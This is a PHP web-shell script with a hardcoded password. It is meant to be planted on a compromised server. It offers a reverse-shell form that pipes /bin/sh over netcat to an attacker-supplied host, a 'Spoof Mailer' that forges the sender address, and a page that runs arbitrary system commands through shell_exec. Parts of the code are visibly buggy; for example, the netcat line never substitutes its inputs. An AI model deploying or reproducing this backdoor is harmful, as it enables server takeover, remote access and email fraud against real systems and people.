<?php
$password = 'h4x'; # set password here 
if ($_POST['pass'] == $password){ 
  setcookie("auth");
}
if (isset($_COOKIE['auth'])){
echo '<title>Simple Shell</title><style>
body 
  {
    background-image:url("http://i.imgur.com/LZ7EQ.jpg");
  }
</style>';
  echo
  '<center><a href="?page=1">Reverse Shell</a> <a href="?page=2">Spoof Mailer</a> <a href="?page=3">Shell</a></center>';
if (isset($_GET['page'])) {
  if ($_GET['page'] == 1)   {
   echo '<form method = "POST">
    <center><font face="Cooper Black" color="#00688B">IP:</font><input type="text" name="RHOST" />
    <font face="Cooper Black" color="#00688B">Port:</font><input type="text" name="Port"/>
    <input type="submit" name="submit2" /></center>';
      if (isset($_POST['RHOST'])){
        exec('nc -e /bin/sh $_POST["RHOST"] $_POST["Port"]');
    }
}
  if ($_GET['page'] == 2){
  echo '
  <html><body>
  <form method="post">
  <font face="Cooper Black" color="#00688B">From:  </font><input type="text" name="from" /> <br />
  <font face="Cooper Black" color="#00688B">To: </font><input type="text" name="to" /><br />
  <font face="Cooper Black" color="#00688B">Subject: </font><input type="text" name="subject" /><br />
  <font face="Cooper Black" color="#00688B">Message:  </font><input type="text" name="message" /><br />
  <font face="Cooper Black" color="#00688B">Password: </font><input type="text" name="auth" /> <br />
  <input type="submit" name="submit" /><br />
  </form>
';

if ($_POST['auth'] == 'angel'){

    $From    = $_POST['from'];
    $to      = $_POST['to'];
    $subject = $_POST['subject'];
    $message = $_POST['message'];
    $headers = 'From:' . $From;
     mail($to, $subject, $message, $headers);
    }
  }
}
  if($_GET['page'] == '3') {
    echo '
  <form method="POST">
  <center><font face="helvetica" color="#00688B">Command: </font><input type="text" name = "cmd" />
  <input type="submit" name="submit" />
  </center></form>
';
  if (isset($_POST['cmd'])){
    $output = shell_exec($_POST['cmd']);
echo '<center>
  <pre>
  <marquee behavior="alternate" width=100 height=20>
  <font color="#00688B">&#8711;</font color></marquee>
  <br />
  <font face="Cooper Black" color="#00688B">'.$output.'</font>
  </pre>
  </center>'
;
    }
  }
}
else {
echo'
<form method = "POST">
<center>
<font face="Cooper Black color="#00688B">Pass:</font>
<input type="password" name="pass"/>
<input type="submit" name="submit" />'; 
  }
?>
